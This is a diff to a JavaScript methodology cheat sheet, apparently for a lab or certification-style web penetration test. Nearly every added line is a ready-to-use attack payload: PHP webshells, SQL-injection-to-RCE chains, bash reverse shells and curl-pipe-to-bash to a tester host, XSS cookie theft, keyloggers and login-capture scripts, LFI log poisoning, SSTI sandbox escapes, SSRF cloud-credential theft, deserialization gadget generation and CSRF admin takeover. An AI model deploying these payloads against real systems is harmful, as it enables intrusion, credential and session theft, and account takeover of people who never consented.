@@ -39,7 +39,9 @@ window.METHODOLOGY = {
           tell: "Don't rabbit-hole. Timebox recon, hit the high-yield bugs, and the moment you get an admin session / file-read / RCE, grab the files and screenshot.",
           cmds: [
             { note: true, tool: "loop", cmd: "1) Recon/map  2) Pick the loudest bug class for the stack  3) Get admin session OR file-read OR command-exec  4) Grab local.txt + proof.txt  5) Screenshot per the rules below  6) Next app." },
-            { note: true, tool: "mindset", cmd: "Each app is usually ONE main chain. Framework + error style tells you which class. If ~30 min on a class yields nothing, switch classes, not targets — then come back. Full day + overnight: pace yourself, sleep." }
+            { note: true, tool: "mindset", cmd: "Each app is usually ONE main chain. Framework + error style tells you which class. If ~30 min on a class yields nothing, switch classes, not targets — then come back. Full day + overnight: pace yourself, sleep." },
+            { note: true, tool: "runbook", cmd: "Full multi-target game plan — first-15-min checklist, bug-class-by-stack table, primitive→proof matrix, evidence rules, submission checklist: scripts/payloads/runbook.md" },
+            { note: true, tool: "patterns", cmd: "Pattern index — match the surface you're seeing (comment feature, System-Info POST, CV-upload, sequential IDs, login error, Spring app…) to the exact chain it wants: scripts/payloads/lab-patterns.md" }
           ] },
         { label: "Emulated users (bots)", sev: "high",
           tell: "Some targets run a bot that visits pages on a timer — a stand-in admin. That makes STORED / BLIND XSS and CSRF live attacks: plant a payload where the bot will view it and steal its session or act as it.",
@@ -131,6 +133,13 @@ window.METHODOLOGY = {
           cmds: [
             { note: true, tool: "Burp", cmd: "Set browser proxy to 127.0.0.1:8080, walk the whole app once, then work from Target > Site map / HTTP history in Repeater." },
             { tool: "nuclei", cmd: "nuclei -u {target_url} -t http/technologies/ -t http/exposures/   # map/triage only" }
+          ] },
+        { label: "CMS fast path (WordPress / Joomla / Drupal)", sev: "high",
+          tell: "If it's a CMS, skip generic fuzzing and go straight for the known wins: enumerate users/plugins/themes, weak creds, then admin-panel RCE (theme/plugin editor). WordPress is by far the common one.",
+          cmds: [
+            { tool: "cms-scan", cmd: "scripts/cms-scan.sh {target_url} {target_host}   # detect + run wpscan/joomscan/droopescan and print the attack path" },
+            { tool: "wpscan", cmd: "wpscan --url {target_url} --disable-tls-checks --enumerate u,ap,at,cb,dbe --plugins-detection aggressive" },
+            { note: true, tool: "WP → RCE", cmd: "Admin login (enum'd user + weak pass / login-enum.sh) → Appearance > Theme Editor: set 404.php to <?php system($_GET[0]);?> → /wp-content/themes/<t>/404.php?0=id. Or upload a malicious plugin zip. Secrets: /wp-config.php via LFI/backup; xmlrpc.php for faster brute." }
           ] }
       ]
     },
@@ -200,6 +209,7 @@ window.METHODOLOGY = {
         { label: "Default & weak creds / brute", sev: "high",
           tell: "Try the obvious first (admin/admin, app-name, creds in JS/docs/.git). To brute, FIRST find the real failure string and enumerate users — a distinct 'no such user' vs 'wrong password' message is a user-enum oracle; brute only the valid names. Always pass -o so a backgrounded run's result isn't lost, and -f to stop on the first hit.",
           cmds: [
+            { tool: "login-enum (auto)", cmd: "scripts/login-enum.sh {target_url}/login 'username=^USER^&password=^PASS^' /usr/share/seclists/Usernames/top-usernames-shortlist.txt POST   # auto: oracle -> valid users -> ffuf brute" },
             { tool: "user-enum", cmd: "for u in admin root the-app-names; do printf '%s ' $u; curl -s {target_url}/login -d \"username=$u&password=x\" | grep -oE 'no such user|incorrect password|does not exist'; echo; done   # find the oracle, keep valid users" },
             { tool: "ffuf (fast)", cmd: "ffuf -u {target_url}/login -X POST -d 'username=bob&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/wordlists/rockyou.txt -fr 'Incorrect Password' -fc 403,404,500 -ac -t 40 -o loot/{target_host}-brute.json -of json" },
             { tool: "hydra", cmd: "hydra -l bob -P /usr/share/wordlists/rockyou.txt -f -t 16 -o loot/{target_host}-hydra.txt {target_host} http-post-form '/login:username=^USER^&password=^PASS^:F=<failure string>'" },
@@ -276,6 +286,15 @@ window.METHODOLOGY = {
             { tool: "probe", cmd: "'" },
             { tool: "probe", cmd: "1' AND '1'='1   (true)   vs   1' AND '1'='2   (false)" },
             { tool: "curl",  cmd: "curl -s \"{target_url}/page?id=1'\"   # look for SQL error text / 500" }
+          ],
+          xtell: "Dumping the users table is points, but the objective is access. Turn SQLi into RCE or a direct read of the proof file. Pick by DBMS.",
+          exploit: [
+            { tool: "mysql webshell", cmd: "' UNION SELECT '<?php system($_GET[0]); ?>','' INTO OUTFILE '/var/www/html/s.php'-- -   # then: curl {target_url}/s.php?0=id   (needs FILE priv + empty @@secure_file_priv + known webroot)" },
+            { tool: "mysql read proof", cmd: "' UNION SELECT LOAD_FILE('/root/proof.txt'),2-- -   # or /home/*/local.txt, /var/www/html/config.php" },
+            { tool: "mssql RCE", cmd: "'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'-- -" },
+            { tool: "postgres RCE", cmd: "'; COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/{tester_ip}/{tester_port} 0>&1\"'-- -   # or: CREATE TABLE t(x text); COPY t FROM PROGRAM 'id';" },
+            { tool: "creds → reuse", cmd: "' UNION SELECT group_concat(user,0x3a,password),2 FROM users-- -   # crack offline (hashcat/john), then log in = admin session + local.txt" },
+            { note: true, tool: "stacked takeover", cmd: "Where stacked queries run: UPDATE a known admin's password hash to one you control, or INSERT your own admin row, then log in. Faster than cracking." }
           ] },
         { label: "Auto-find boundary + DBMS (local, no AI)", sev: "high",
           tell: "Mechanically cycles break-out boundaries (', '), ')), \", LIKE %, numeric) and comment styles, finds the one giving a stable TRUE vs FALSE, then fingerprints the engine with one engine-only probe each. Pure local curl — no third-party calls, safe for tool-restricted engagements. Feed it a base value that returns a row and a marker string from a normal response.",
@@ -352,6 +371,20 @@ window.METHODOLOGY = {
             { tool: "probe", cmd: "wzq'\"><svg/onload=confirm(1)>wzq" },
             { tool: "curl",  cmd: "curl -s '{target_url}/search?q=wzq__marker__' | grep -n wzq__marker__" }
           ] },
+        { label: "Filtered XSS — characters blocked", sev: "crit",
+          tell: "Real targets strip chars; alert()/fetch()/`+` payloads then all die. FIRST find what survives, then pick a technique that needs only those chars. The strongest cookie-steal under a harsh blocklist uses NO function calls and NO string concatenation. Full matrix: scripts/payloads/xss-filtered.md",
+          cmds: [
+            { tool: "probe", cmd: "scripts/xss-filter-probe.sh {target_url}/page field {target_url}/page POST   # reports which chars are KEPT vs STRIPPED" },
+            { note: true, tool: "read it", cmd: "Decide by what's blocked: no () = no function calls (use assignment + event handlers); no + / backtick / ${} = no concat (use <base>+relative URL); no ? = put data in the PATH; no <> = break out of the current tag via an attribute/handler." }
+          ],
+          xtell: "The move that beats the worst filter (no ( ) + ` $ { } [ ]): a <base> tag retargets a RELATIVE url to your box, then location=document.cookie sends the cookie as the PATH — zero blocked chars. Catch with python3 -m http.server PORT.",
+          exploit: [
+            { tool: "base + location", cmd: "<base href=\"http://{tester_ip}:{tester_port}/\"><script>location=document.cookie</script>   // cookie arrives as GET /PHPSESSID=... in your http.server log" },
+            { tool: "no <script>? handler", cmd: "<base href=\"//{tester_ip}:{tester_port}/\"><img src=x onerror=location=document.cookie>   // event handler, no function call, no quotes needed" },
+            { tool: "confirm first", cmd: "<img src=x onerror=location=document.URL>   // proves JS runs past the filter before you commit the cookie payload" },
+            { note: true, tool: "ordering (stored)", cmd: "First <base> and first navigation in the page WIN — an earlier stored comment's payload preempts yours. On a shared lab, revert to clear stored entries so YOUR payload lands." },
+            { note: true, tool: "HttpOnly", cmd: "Can't read document.cookie? Don't steal it — ACT in the session: fetch an admin endpoint / submit with a scraped CSRF token (see xss-exploitation.md)." }
+          ] },
         { label: "Context breakout payloads",
           tell: "Pick by where your marker landed.",
           cmds: [
@@ -361,6 +394,16 @@ window.METHODOLOGY = {
             { tool: "js-template", cmd: "${alert(document.domain)}" },
             { tool: "href",      cmd: "javascript:alert(document.domain)" },
             { tool: "filter-bypass", cmd: "<svg/onload=alert`1`>  ·  <img src=x onerror=\\u0061lert(1)>  ·  oNeRrOr" }
+          ],
+          xtell: "alert(1) only proves execution — it earns nothing. Once your JS runs in the victim's page it runs AS them, in their session. Pick the action by what you need and what the page's CSP allows. Primer + how each line works: scripts/payloads/xss-exploitation.md",
+          exploit: [
+            { note: true, tool: "loader first", cmd: "Keep the injected payload tiny and load the real logic from your box, so you can iterate without re-injecting:  <script src=http://{tester_ip}:{tester_port}/x.js></script>  (serve x.js from your catcher dir). Note: a <script> added via innerHTML does NOT run — use an event handler (onerror/onload) or src." },
+            { tool: "steal cookie", cmd: "<script>new Image().src='http://{tester_ip}:{tester_port}/c?'+encodeURIComponent(document.cookie)</script>   // only if NOT HttpOnly" },
+            { tool: "read a page as them", cmd: "<script>fetch('/admin',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('http://{tester_ip}:{tester_port}/p',{method:'POST',body:t}))</script>   // their session reads it; often contains the local flag" },
+            { tool: "exfil DOM/secrets", cmd: "<script>fetch('http://{tester_ip}:{tester_port}/d',{method:'POST',body:document.documentElement.innerHTML})</script>" },
+            { tool: "keylogger", cmd: "<script>onkeyup=e=>new Image().src='http://{tester_ip}:{tester_port}/k?'+e.key</script>" },
+            { tool: "phish creds", cmd: "<script>document.forms[0].onsubmit=function(){new Image().src='http://{tester_ip}:{tester_port}/f?'+encodeURIComponent(new URLSearchParams(new FormData(this)))}</script>   // capture a login the victim submits" },
+            { note: true, tool: "CSP blocks fetch?", cmd: "If fetch/connect-src is blocked, exfil via navigation or img (they hit your catcher regardless): location='http://{tester_ip}:{tester_port}/r?c='+document.cookie  — or set an <img>/<link rel=prefetch>. Check the CSP header first: curl -sI {target_url} | grep -i content-security." }
           ] },
         { label: "Steal a session (reflected/stored)", sev: "crit",
           tell: "If HttpOnly isn't set, exfil the cookie to your catcher. Otherwise exfil CSRF tokens / page content / do an action as the victim.",
@@ -375,6 +418,22 @@ window.METHODOLOGY = {
           cmds: [
             { tool: "beacon", cmd: "<script>new Image().src='http://{tester_ip}:{tester_port}/blind?u='+encodeURIComponent(location)</script>" },
             { tool: "keylogger", cmd: "<script>document.onkeypress=e=>new Image().src='http://{tester_ip}:{tester_port}/k?'+e.key</script>" }
+          ] },
+        { label: "Emulated user → steal the admin session", sev: "crit",
+          tell: "Targets with a bot that 'visits' pages on a timer are handing you an admin: plant stored/blind XSS where the bot will view it (comment, ticket, profile, filename, log, contact form), steal its cookie to your catcher, then RIDE that session to the admin area (local flag lives there).",
+          cmds: [
+            { note: true, tool: "1. catch", cmd: "scripts/catch-server.py {tester_port} --bind {tester_ip}   # waits for the bot's callback" },
+            { tool: "2. plant", cmd: "<script>new Image().src='http://{tester_ip}:{tester_port}/bot?c='+encodeURIComponent(document.cookie)</script>" },
+            { tool: "3. ride", cmd: "scripts/ride-session.sh {target_url} 'PHPSESSID=<stolen>'   # probes admin pages + greps the flag, then an authed request loop" },
+            { note: true, tool: "HttpOnly?", cmd: "If the cookie is HttpOnly you can't read it — instead have the XSS ACT as the bot: fetch an admin endpoint with credentials:'include' (make-an-admin, read a page, exfil its body)." }
+          ],
+          xtell: "THE KEY FIX when a bot visits but 'won't click/submit': you don't need it to. Your injected JS is already running inside its authenticated session — so DO the action yourself with fetch/XHR. The browser attaches the bot's cookies automatically (credentials:'include'). If the action needs a CSRF token, fetch the form page first, scrape the token, then submit. Walkthrough: scripts/payloads/xss-exploitation.md",
+          exploit: [
+            { tool: "A. action, no token", cmd: "<script>fetch('{target_url}/admin/promote',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'user=me&role=admin'})</script>" },
+            { tool: "B. token-aware chain", cmd: "<script>fetch('{target_url}/admin/users/new',{credentials:'include'}).then(r=>r.text()).then(h=>{var t=h.match(/name=\"(?:csrf|_token|authenticity_token)\" value=\"([^\"]+)\"/)[1];fetch('{target_url}/admin/users/new',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'_token='+t+'&username=pwn&password=Pwn123!&role=admin'})})</script>" },
+            { tool: "C. read admin page→exfil", cmd: "<script>fetch('{target_url}/admin',{credentials:'include'}).then(r=>r.text()).then(t=>new Image().src='http://{tester_ip}:{tester_port}/a?d='+encodeURIComponent(t.slice(0,3000)))</script>   // the local flag is often right here" },
+            { tool: "D. take over the bot", cmd: "<script>fetch('{target_url}/account/email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=you@evil.test'})</script>   // then use password-reset to own the account" },
+            { note: true, tool: "why this works", cmd: "The bot renders your injection, your script runs in its origin+session, fetch() auto-sends its cookies. You never needed a click. Host the logic as an external x.js so you can iterate; watch catch-server for each step's result. If <script> won't run (added via innerHTML), deliver via <img src=x onerror=...> or an external src." }
           ] },
         { label: "DOM XSS",
           tell: "Source → sink in client JS: location.hash/search into innerHTML/eval/document.write. No server round-trip.",
@@ -399,6 +458,14 @@ window.METHODOLOGY = {
             { tool: "sep", cmd: "& whoami" },
             { tool: "sub", cmd: "$(id)   ·   `id`" },
             { tool: "newline", cmd: "%0aid" }
+          ],
+          xtell: "`id` proves it; now get an interactive shell and read proof. Start a listener (Reverse Shells tab) first. If output is blind or egress is filtered, exfil through your catcher.",
+          exploit: [
+            { tool: "revshell", cmd: "; bash -c 'bash -i >& /dev/tcp/{tester_ip}/{tester_port} 0>&1'   # or: ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {tester_ip} {tester_port} >/tmp/f" },
+            { tool: "fetch+run (no nc)", cmd: "; curl http://{tester_ip}:{tester_port}/s.sh|bash   # host s.sh on your catcher; survives when a direct one-liner is mangled by the filter" },
+            { tool: "TTY upgrade", cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'   then Ctrl-Z; stty raw -echo; fg; export TERM=xterm" },
+            { tool: "read proof (blind)", cmd: "; curl http://{tester_ip}:{tester_port}/?d=$(cat /root/proof.txt|base64 -w0)   # pull files out when no shell/output" },
+            { tool: "filter bypass", cmd: "cat</etc/passwd  ·  {cat,/etc/passwd}  ·  cat$IFS/etc/passwd  ·  w'h'o'a'mi  ·  echo aWQ=|base64 -d|sh   # no-space / keyword-split / b64" }
           ] },
         { label: "Blind: time + OAST", sev: "crit",
           tell: "No output? Prove exec with a delay or a callback to your catcher.",
@@ -443,6 +510,18 @@ window.METHODOLOGY = {
             { tool: "nested",    cmd: "{target_url}/download?file=..%252f..%252f..%252fetc%252fpasswd" },
             { tool: "absolute",  cmd: "{target_url}/download?file=/etc/passwd" },
             { tool: "ffuf",      cmd: "ffuf -u '{target_url}/download?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fc 404" }
+          ],
+          xtell: "Reading /etc/passwd proves it; now either read the proof file directly or turn the read into code execution. Order: try direct read, then filter-chain (no extra access needed), then poisoning.",
+          exploit: [
+            { tool: "read proof", cmd: "{target_url}/index.php?page=php://filter/convert.base64-encode/resource=/root/proof.txt   # also /home/*/local.txt, config.php, .env, /var/www/html/db.php" },
+            { tool: "filter-chain RCE", cmd: "python3 /opt/php_filter_chain_generator/php_filter_chain_generator.py --chain '<?php system($_GET[0]);?>'   # paste the long php://filter chain as page=, then &0=id — RCE with only an LFI, no logs/upload" },
+            { tool: "log poison", cmd: "curl {target_url}/ -A '<?php system($_GET[0]); ?>'   then   {target_url}/index.php?page=/var/log/apache2/access.log&0=id   # also /var/log/nginx/access.log, /var/log/auth.log (ssh '<?php..?>'@host)" },
+            { tool: "proc environ", cmd: "{target_url}/index.php?page=/proc/self/environ&0=id   # poison via User-Agent; also /proc/self/fd/N" },
+            { tool: "session poison", cmd: "# set a cookie value to <?php system($_GET[0]);?>, then include the session file:\n{target_url}/index.php?page=/var/lib/php/sessions/sess_<PHPSESSID>&0=id" },
+            { tool: "pearcmd RCE", cmd: "{target_url}/index.php?page=/usr/local/lib/php/pearcmd.php&+config-create+/<?=system($_GET[0]);?>+/tmp/x.php&0=id   # register_argc_argv trick, no upload needed" },
+            { tool: "data/expect", cmd: "{target_url}/index.php?page=expect://id   ·   data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==&0=id   # if allow_url_include=On" },
+            { tool: "read key → SSH", cmd: "read a private key via the traversal/read, then pivot:  curl '{target_url}/download?file=../../../../home/USER/.ssh/id_rsa' -o id_rsa; chmod 600 id_rsa; ssh -i id_rsa USER@{target_ip}   # passphrase? ssh2john id_rsa>h; john h" },
+            { note: true, tool: "Spring/Java targets", cmd: "Java app? read WEB-INF/classes/application.properties (or .yml) for DB/creds, or hit /actuator/env · /actuator/heapdump · /actuator/mappings and grep for password/secret." }
           ] },
         { label: "PHP wrappers", sev: "crit",
           tell: "php://filter base64-reads source without executing it (grab config / creds). data:// and expect:// can give RCE if allow_url_include is on.",
@@ -515,6 +594,16 @@ window.METHODOLOGY = {
             { tool: "probe", cmd: "<%= 7*7 %>" },
             { tool: "probe", cmd: "#{7*7}" },
             { tool: "probe", cmd: "{{7*'7'}}   (Jinja2→7777777 · Twig→49 — disambiguates the two)" }
+          ],
+          xtell: "49 confirms eval; the basic RCE one-liner (next item) is the goal. When it's filtered, sandboxed, or blind, escalate with these. Swap id for a reverse shell once it lands.",
+          exploit: [
+            { tool: "jinja2 sandbox-escape", cmd: "{{ ''.__class__.__mro__[1].__subclasses__() }}   # list classes, find Popen's index N, then:\n{{ ''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate() }}" },
+            { tool: "jinja2 filter bypass", cmd: "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}   # dotless/underscore-less when '.'/'_' filtered" },
+            { tool: "jinja2 no-braces", cmd: "{%print(cycler.__init__.__globals__.os.popen('id').read())%}   # when {{ }} is blocked but {% %} isn't" },
+            { tool: "jinja2 file read", cmd: "{{ get_flashed_messages.__globals__.__builtins__.open('/root/proof.txt').read() }}" },
+            { tool: "blind SSTI (time/OAST)", cmd: "{{cycler.__init__.__globals__.os.popen('sleep 5').read()}}   # or ...popen('curl http://{tester_ip}:{tester_port}/ssti-$(whoami)')" },
+            { tool: "twig RCE alts", cmd: "{{['id']|map('system')|join}}   ·   {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}" },
+            { tool: "freemarker/velocity", cmd: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}   ·   Velocity: #set($e=$x.getClass().forName('java.lang.Runtime')...exec('id'))" }
           ] },
         { label: "RCE by engine", sev: "crit",
           tell: "Paste the matching one-liner. Swap `id` for your reverse-shell command once confirmed.",
@@ -547,6 +636,15 @@ window.METHODOLOGY = {
           tell: "Any URL feature: webhook, import, avatar/CV, renderer, link preview. Confirm with a listener hit.",
           cmds: [
             { tool: "curl", cmd: "curl -s {target_url}/api/user/preview/cv -H 'Cookie: {cookie}' --data 'cv=http://{tester_ip}:{tester_port}/ssrf-probe'" }
+          ],
+          xtell: "A callback proves SSRF; the points come from what it reaches. Hit internal-only services, steal cloud creds, or POST to an internal admin API via gopher.",
+          exploit: [
+            { tool: "cloud creds (AWS)", cmd: "cv=http://169.254.169.254/latest/meta-data/iam/security-credentials/   then append the role name → AccessKeyId/SecretAccessKey/Token" },
+            { tool: "cloud creds (GCP/Azure)", cmd: "GCP: http://metadata.google.internal/computeMetadata/v1/ (needs header Metadata-Flavor:Google)  ·  Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Metadata:true)" },
+            { tool: "reach internal app", cmd: "cv=http://127.0.0.1/admin   ·  scan internal ports: loop cv=http://127.0.0.1:PORT/ and watch response time/size for open services" },
+            { tool: "denylist bypass", cmd: "http://0/  http://127.0.0.1.nip.io/  http://2130706433/  http://[::1]/  http://127.0.0.1%2561@evil/  — or a 302 redirector: scripts/ssrf-redirect.py 8000 http://127.0.0.1/admin" },
+            { tool: "gopher → internal POST", cmd: "gopherus --exploit   # build gopher://127.0.0.1:PORT/_<raw request> to hit redis / mysql / FastCGI / an internal admin API that needs a body (curl-based fetchers only)" },
+            { tool: "file read", cmd: "cv=file:///root/proof.txt   # if the fetcher allows file:// (read the UA to know)" }
           ] },
         { label: "Fingerprint the fetcher",
           tell: "Read the User-Agent on your listener: curl (gopher/redirects), requests (no gopher), headless (file://,JS).",
@@ -582,6 +680,15 @@ window.METHODOLOGY = {
             { note: true, tool: "mime",  cmd: "Set Content-Type: image/png on the upload part while the body stays PHP." },
             { note: true, tool: "magic", cmd: "Prepend GIF89a; or embed PHP in PNG/EXIF so magic bytes pass: exiftool -Comment='<?php system($_GET[0]);?>' x.png" },
             { note: true, tool: "htaccess", cmd: "Upload .htaccess with 'AddType application/x-httpd-php .jpg' to run .jpg as PHP." }
+          ],
+          xtell: "Getting the file accepted is half of it — you still have to REACH and EXECUTE it. Find the stored path, then convert to a shell; if the ext is locked, make the server run it another way.",
+          exploit: [
+            { tool: "find the path", cmd: "Read the upload response / Location header; else fuzz: ffuf -u {target_url}/uploads/FUZZ -w list   # common: /uploads /files /images /avatars /media /tmp" },
+            { tool: "execute → shell", cmd: "curl '{target_url}/uploads/shell.php?0=bash -c \"bash -i >%26 /dev/tcp/{tester_ip}/{tester_port} 0>%261\"'   # (URL-encode & as %26)" },
+            { tool: "ext locked? .htaccess", cmd: "Upload .htaccess: 'AddType application/x-httpd-php .jpg' (Apache+mod_php) → your shell.jpg now runs as PHP. For IIS use web.config." },
+            { tool: "image polyglot + LFI", cmd: "If only images run but there's an LFI elsewhere: upload PHP-in-PNG, then include it — {target_url}/index.php?page=/uploads/x.png&0=id" },
+            { tool: "zip/phar", cmd: "phar:// or zip:// wrapper on an uploaded archive to reach the inner PHP; or upload a .phar if .phar executes." },
+            { tool: "SVG/XXE or stored XSS", cmd: "If it must be an 'image', an uploaded SVG can carry XXE (file read) or stored XSS (fires when the admin/bot views the gallery)." }
           ] }
       ]
     },
@@ -603,17 +710,38 @@ window.METHODOLOGY = {
             { tool: "json", cmd: "curl -s {target_url}/api/user/update -H 'Cookie: {cookie}' -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}'" },
             { tool: "arjun", cmd: "arjun -u {target_url}/api/user/update -m POST   # find the hidden field first" }
           ] },
-        { label: "Deserialization", sev: "high",
-          tell: "Serialized blobs in cookies/params: PHP O:… strings, Java rO0AB…/base64 ac ed 00 05, .NET, Python pickle.",
+        { label: "Deserialization", sev: "crit",
+          tell: "Serialized blobs in cookies/params/viewstate/uploads. Spot the language, CONFIRM it deserializes (URLDNS/OAST, no RCE risk), match a gadget chain to the app's libraries, then generate with the allowed tools. Full matrix: scripts/payloads/deserialization.txt",
           cmds: [
-            { note: true, tool: "spot it", cmd: "PHP: a:/O: prefix · Java: starts 'rO0' (b64) or hex 'ac ed 00 05' · Node: look for node-serialize {\"rce\":_$$ND_FUNC$$_" },
-            { tool: "ysoserial", cmd: "java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0   # Java gadget" }
+            { note: true, tool: "spot it", cmd: "PHP O:/a: · Java 'rO0'(b64) or hex 'ac ed 00 05' · .NET 'AAEAAAD/////' / __VIEWSTATE · Python pickle 'gASV'/'\\x80\\x04' · Node _$$ND_FUNC$$_ · Ruby '\\x04\\x08'" },
+            { tool: "confirm", cmd: "java -jar ysoserial.jar URLDNS http://{tester_ip}:{tester_port}/dz | base64 -w0   # a callback proves deserialization before you weaponize" },
+            { tool: "java", cmd: "java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,<b64>}|{base64,-d}|bash' | base64 -w0   # match the chain to the classpath" },
+            { tool: "php", cmd: "phpggc -b Monolog/RCE1 system id   # or a custom __destruct/__wakeup gadget — see the payload file" },
+            { tool: "dotnet", cmd: "ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'cmd /c whoami' -o base64   # ViewState: -p ViewState with leaked key" },
+            { tool: "python", cmd: "python3 -c 'import pickle,os,base64;print(base64.b64encode(pickle.dumps(type(\"x\",(),{\"__reduce__\":lambda s:(os.system,(\"id\",))})())).decode())'" }
+          ],
+          xtell: "You generated a gadget — now deliver it into the exact sink and catch a shell. If the first chain fails it's usually a classpath mismatch, not a dead end: try others.",
+          exploit: [
+            { note: true, tool: "deliver", cmd: "Put the (base64) blob in the EXACT field the app deserializes — cookie / param / __VIEWSTATE / uploaded file. URL-encode if it rides in a URL. Start your listener first." },
+            { tool: "java revshell", cmd: "RC=$(echo 'bash -i >& /dev/tcp/{tester_ip}/{tester_port} 0>&1'|base64 -w0); java -jar ysoserial.jar CommonsCollections6 \"bash -c {echo,$RC}|{base64,-d}|bash\" | base64 -w0" },
+            { tool: "try other chains", cmd: "CommonsCollections1-7 · Spring1/2 · Groovy1 · Hibernate1 · ROME · for a blind target use URLDNS/JRMP to see which library is present before committing." },
+            { tool: "php → webshell", cmd: "phpggc Guzzle/FW1 /var/www/html/s.php /path/shell.txt   # FileWrite gadget drops a webshell; or Monolog/RCE1 system '...' for direct exec" },
+            { tool: ".NET ViewState", cmd: "Leaked machineKey (web.config via LFI) or MAC-less __VIEWSTATE → ysoserial.exe -p ViewState -g TextFormattingRunProperties -c 'cmd /c <revshell>' --generator=<GEN> --validationkey=<KEY> --validationalg=SHA1" }
           ] },
         { label: "Workflow / race",
           tell: "Skip steps, replay, reorder; parallel requests against balance/stock/coupons/one-time tokens.",
           cmds: [
             { tool: "race", cmd: "seq 30 | xargs -P30 -I_ curl -s {target_url}/api/redeem -H 'Cookie: {cookie}' -d 'code=ONCE'" },
             { note: true, tool: "Turbo Intruder", cmd: "Single-packet-attack template for tighter timing windows." }
+          ] },
+        { label: "CSRF", sev: "high",
+          tell: "A state-changing request with no anti-CSRF token (or a cookie that's not SameSite) can be forced on a logged-in victim — and an emulated/admin user that browses the app is the perfect victim. Make it change role/email/password or create an admin, then log in as them.",
+          cmds: [
+            { note: true, tool: "check", cmd: "Replay a sensitive POST with NO csrf/token field and a fresh session — if it still works, it's CSRF-able. Note the cookie's SameSite flag (None/absent = forgeable cross-site)." },
+            { tool: "csrf-gen (form)", cmd: "scripts/csrf-gen.sh POST {target_url}/account/update 'email=you@evil.test&role=admin'   # auto-submitting form PoC" },
+            { tool: "csrf-gen (json)", cmd: "scripts/csrf-gen.sh POST {target_url}/api/user '{\"role\":\"admin\"}'   # fetch+credentials PoC (needs tokenless + permissive CORS/SameSite)" },
+            { note: true, tool: "deliver", cmd: "Host the PoC (python3 -m http.server) and get the bot to visit it — directly, or by injecting the link/iframe via stored XSS. Token-protected actions need XSS to read the token first." },
+            { note: true, tool: "token bypass", cmd: "Before giving up on a CSRF token: DROP the token field entirely, or send it BLANK — many apps only check it's present, not valid. Also try reusing another user's token, swapping POST→GET, or deleting the anti-CSRF header. If it then works, chain with XSS to fire it at the admin." }
           ] }
       ]
     },
